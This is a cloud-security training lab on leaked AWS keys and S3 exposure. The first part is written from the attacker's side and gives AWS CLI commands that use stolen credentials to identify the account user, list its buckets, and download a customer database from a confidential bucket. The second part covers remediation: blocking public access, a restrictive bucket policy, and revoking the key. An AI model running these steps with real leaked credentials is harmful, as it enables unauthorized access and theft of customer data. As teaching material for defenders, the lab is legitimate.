---
title: "06 - Hands-on Lab: Leaked Keys & S3 Exposure"
description: "In this self-contained lab, you will play the role of an attacker who discovers leaked AWS credentials, uses them to map the environment, and discover..."
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "03 Cloud And Infra", "Cloud Security", "06 Hands On Lab.Md"]
---

# 06 - Hands-on Lab: Leaked Keys & S3 Exposure

In this self-contained lab, you will play the role of an attacker who discovers leaked AWS credentials, uses them to map the environment, and discovers sensitive data in an improperly secured S3 bucket. Finally, you will switch to the defender role to remediate the vulnerability.

## Scenario
A developer accidentally committed their AWS Access Keys to a public GitHub repository. You have recovered these keys.

## Phase 1: Exploitation (Attacker Role)

### 1. Configure the Stolen Credentials
Set up the AWS CLI using the compromised keys.
```bash
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_DEFAULT_REGION="us-east-1"
```

### 2. Reconnaissance (Who am I?)
Determine the identity associated with the keys.
```bash
aws sts get-caller-identity
```
*Output snippet:*
```json
{
    "UserId": "AIDA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/dev-user-01"
}
```

### 3. Enumerating Privileges
Let's see what S3 buckets exist in the account.
```bash
aws s3 ls
```
*Output snippet:*
```text
2023-10-01 12:00:00 appsec-atlas-confidential-backups
2023-10-01 12:05:00 appsec-atlas-public-assets
```

### 4. Data Exfiltration
Attempt to list and download the contents of the confidential bucket.
```bash
aws s3 ls s3://appsec-atlas-confidential-backups
aws s3 cp s3://appsec-atlas-confidential-backups/customer_database.sql .
```
Success! The bucket was lacking proper resource policies and allowed any authenticated AWS user (or the specific compromised user) to download the data.

## Phase 2: Remediation (Defender Role)

To fix this, we need to apply **S3 Block Public Access** and restrict bucket access using a Bucket Policy.

### 1. Enable Account-Level Block Public Access
Ensure no bucket can be made public unintentionally.
```bash
aws s3control put-public-access-block \
    --account-id 123456789012 \
    --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
```

### 2. Apply a Secure S3 Bucket Policy
Ensure only a specific, highly-trusted IAM Role (e.g., the Backup Service) can access the confidential bucket.

**secure-bucket-policy.json:**
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::appsec-atlas-confidential-backups",
                "arn:aws:s3:::appsec-atlas-confidential-backups/*"
            ],
            "Condition": {
                "StringNotLike": {
                    "aws:userId": "AROA...:backup-session"
                }
            }
        }
    ]
}
```

Apply the policy:
```bash
aws s3api put-bucket-policy \
    --bucket appsec-atlas-confidential-backups \
    --policy file://secure-bucket-policy.json
```

### 3. Revoke Compromised Keys
Delete the leaked access key to completely neutralize the threat.
```bash
aws iam delete-access-key \
    --access-key-id AKIAIOSFODNN7EXAMPLE \
    --user-name dev-user-01
```
